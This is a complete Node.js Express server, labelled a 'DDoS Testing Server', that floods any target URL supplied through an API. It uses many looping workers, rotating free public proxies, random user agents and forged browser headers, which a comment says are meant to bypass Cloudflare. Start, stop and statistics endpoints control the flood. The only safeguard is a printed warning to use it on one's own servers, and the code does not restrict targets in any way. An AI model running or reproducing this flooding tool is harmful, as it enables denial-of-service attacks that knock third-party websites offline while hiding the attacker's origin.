const express = require('express');
const axios = require('axios');
const cors = require('cors');
const { Worker } = require('worker_threads');
const app = express();
const PORT = process.env.PORT || 4000;

app.use(cors());
app.use(express.json());

// Attack Statistics
let attackStats = {
  totalRequests: 0,
  successfulRequests: 0,
  failedRequests: 0,
  activeWorkers: 0,
  startTime: null,
  isRunning: false,
  target: null,
  requestsPerSecond: 0
};

// Free Proxy Lists
const freeProxyAPIs = [
  'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
  'https://www.proxy-list.download/api/v1/get?type=http',
  'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
  'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
  'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt'
];

// Proxy Pool
let proxyPool = [];
let lastProxyFetch = 0;

// Fetch fresh proxies
async function fetchProxies() {
  console.log('🔄 Fetching fresh proxies...');
  const now = Date.now();
  
  // Cache proxies for 5 minutes
  if (proxyPool.length > 0 && now - lastProxyFetch < 300000) {
    return proxyPool;
  }

  let allProxies = [];

  for (const api of freeProxyAPIs) {
    try {
      const response = await axios.get(api, { timeout: 5000 });
      const proxies = response.data
        .split('\n')
        .filter(line => line.trim() && line.includes(':'))
        .map(line => line.trim());
      
      allProxies.push(...proxies);
      console.log(`✅ Fetched ${proxies.length} proxies from ${api}`);
    } catch (error) {
      console.log(`❌ Failed to fetch from ${api}`);
    }
  }

  // Remove duplicates
  proxyPool = [...new Set(allProxies)];
  lastProxyFetch = now;
  
  console.log(`✅ Total proxies in pool: ${proxyPool.length}`);
  return proxyPool;
}

// Get random proxy
function getRandomProxy() {
  if (proxyPool.length === 0) return null;
  return proxyPool[Math.floor(Math.random() * proxyPool.length)];
}

// Random User Agents
const userAgents = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
];

function getRandomUserAgent() {
  return userAgents[Math.floor(Math.random() * userAgents.length)];
}

// Generate random headers to bypass Cloudflare
function generateHeaders() {
  return {
    'User-Agent': getRandomUserAgent(),
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'DNT': '1',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'none',
    'Cache-Control': 'max-age=0',
    'Referer': 'https://www.google.com/',
  };
}

// Single attack request
async function sendAttackRequest(target, method = 'GET', data = null, useProxy = true) {
  try {
    const config = {
      method: method,
      url: target,
      headers: generateHeaders(),
      timeout: 10000,
      validateStatus: () => true, // Accept any status
    };

    // Add data for POST requests
    if (method === 'POST' && data) {
      config.data = data;
      config.headers['Content-Type'] = 'application/json';
    }

    // Add proxy if enabled
    if (useProxy) {
      const proxy = getRandomProxy();
      if (proxy) {
        const [host, port] = proxy.split(':');
        config.proxy = {
          host: host,
          port: parseInt(port)
        };
      }
    }

    const response = await axios(config);
    
    attackStats.totalRequests++;
    if (response.status < 500) {
      attackStats.successfulRequests++;
    } else {
      attackStats.failedRequests++;
    }

    return {
      success: true,
      status: response.status,
      size: response.data?.length || 0
    };

  } catch (error) {
    attackStats.totalRequests++;
    attackStats.failedRequests++;
    
    return {
      success: false,
      error: error.message
    };
  }
}

// Attack worker
class AttackWorker {
  constructor(id, target, config) {
    this.id = id;
    this.target = target;
    this.config = config;
    this.isRunning = false;
    this.requestCount = 0;
  }

  async start() {
    this.isRunning = true;
    attackStats.activeWorkers++;

    while (this.isRunning) {
      await sendAttackRequest(
        this.target,
        this.config.method,
        this.config.data,
        this.config.useProxy
      );
      
      this.requestCount++;

      // Small delay to prevent blocking
      if (this.config.delay > 0) {
        await new Promise(resolve => setTimeout(resolve, this.config.delay));
      }
    }

    attackStats.activeWorkers--;
  }

  stop() {
    this.isRunning = false;
  }
}

// Attack Manager
class AttackManager {
  constructor() {
    this.workers = [];
    this.statsInterval = null;
  }

  async startAttack(target, config) {
    if (attackStats.isRunning) {
      throw new Error('Attack already running');
    }

    // Fetch proxies first
    if (config.useProxy) {
      await fetchProxies();
      if (proxyPool.length === 0) {
        throw new Error('No proxies available');
      }
    }

    // Reset stats
    attackStats = {
      totalRequests: 0,
      successfulRequests: 0,
      failedRequests: 0,
      activeWorkers: 0,
      startTime: Date.now(),
      isRunning: true,
      target: target,
      requestsPerSecond: 0
    };

    // Start workers
    for (let i = 0; i < config.workers; i++) {
      const worker = new AttackWorker(i, target, config);
      this.workers.push(worker);
      worker.start(); // Non-blocking
    }

    // Start stats updater
    this.startStatsUpdater();

    console.log(`🚀 Attack started: ${config.workers} workers → ${target}`);
  }

  stopAttack() {
    this.workers.forEach(worker => worker.stop());
    this.workers = [];
    attackStats.isRunning = false;

    if (this.statsInterval) {
      clearInterval(this.statsInterval);
      this.statsInterval = null;
    }

    console.log('🛑 Attack stopped');
  }

  startStatsUpdater() {
    let lastCount = 0;
    
    this.statsInterval = setInterval(() => {
      const currentCount = attackStats.totalRequests;
      attackStats.requestsPerSecond = currentCount - lastCount;
      lastCount = currentCount;
    }, 1000);
  }

  getStats() {
    return {
      ...attackStats,
      duration: attackStats.startTime 
        ? Math.floor((Date.now() - attackStats.startTime) / 1000)
        : 0,
      successRate: attackStats.totalRequests > 0
        ? Math.round((attackStats.successfulRequests / attackStats.totalRequests) * 100)
        : 0
    };
  }
}

const attackManager = new AttackManager();

// API Endpoints

// Start attack
app.post('/api/attack/start', async (req, res) => {
  try {
    const {
      target,
      workers = 10,
      method = 'GET',
      data = null,
      useProxy = true,
      delay = 0
    } = req.body;

    if (!target) {
      return res.status(400).json({
        success: false,
        error: 'Target URL is required'
      });
    }

    // Validate URL
    try {
      new URL(target);
    } catch (e) {
      return res.status(400).json({
        success: false,
        error: 'Invalid target URL'
      });
    }

    await attackManager.startAttack(target, {
      workers,
      method,
      data,
      useProxy,
      delay
    });

    res.json({
      success: true,
      message: 'Attack started',
      config: {
        target,
        workers,
        method,
        useProxy,
        delay
      }
    });

  } catch (error) {
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Stop attack
app.post('/api/attack/stop', (req, res) => {
  attackManager.stopAttack();
  
  res.json({
    success: true,
    message: 'Attack stopped',
    finalStats: attackManager.getStats()
  });
});

// Get stats
app.get('/api/stats', (req, res) => {
  res.json({
    success: true,
    stats: attackManager.getStats(),
    proxyCount: proxyPool.length
  });
});

// Fetch proxies manually
app.post('/api/proxies/refresh', async (req, res) => {
  try {
    await fetchProxies();
    res.json({
      success: true,
      proxyCount: proxyPool.length
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Test single request
app.post('/api/test', async (req, res) => {
  try {
    const { target, useProxy = false } = req.body;

    if (!target) {
      return res.status(400).json({
        success: false,
        error: 'Target URL is required'
      });
    }

    const result = await sendAttackRequest(target, 'GET', null, useProxy);

    res.json({
      success: true,
      result
    });

  } catch (error) {
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Health check
app.get('/health', (req, res) => {
  res.json({
    status: 'ok',
    message: 'DDoS Testing Server',
    version: '1.0',
    timestamp: new Date().toISOString()
  });
});

app.get('/', (req, res) => {
  res.json({
    name: 'DDoS Testing Server',
    version: '1.0',
    warning: '⚠️ USE ONLY ON YOUR OWN SERVERS! Attacking others is illegal!',
    endpoints: {
      'POST /api/attack/start': 'Start attack',
      'POST /api/attack/stop': 'Stop attack',
      'GET /api/stats': 'Get attack statistics',
      'POST /api/proxies/refresh': 'Refresh proxy list',
      'POST /api/test': 'Test single request',
      'GET /health': 'Health check'
    }
  });
});

// Start server
app.listen(PORT, () => {
  console.log(`
╔════════════════════════════════════════════╗
║     ⚡ DDoS TESTING SERVER v1.0 ⚡         ║
╚════════════════════════════════════════════╝

🚀 Server: http://localhost:${PORT}
⚠️  WARNING: Use only on YOUR OWN servers!

Features:
  ✅ Multiple bot workers
  ✅ Free proxy rotation
  ✅ Cloudflare bypass attempts
  ✅ Real-time statistics
  ✅ Custom headers & user agents

Ready to test! 💥
  `);
});

// Cleanup on exit
process.on('SIGTERM', () => {
  attackManager.stopAttack();
  console.log('Server shutting down...');
  process.exit(0);
});

module.exports = app;
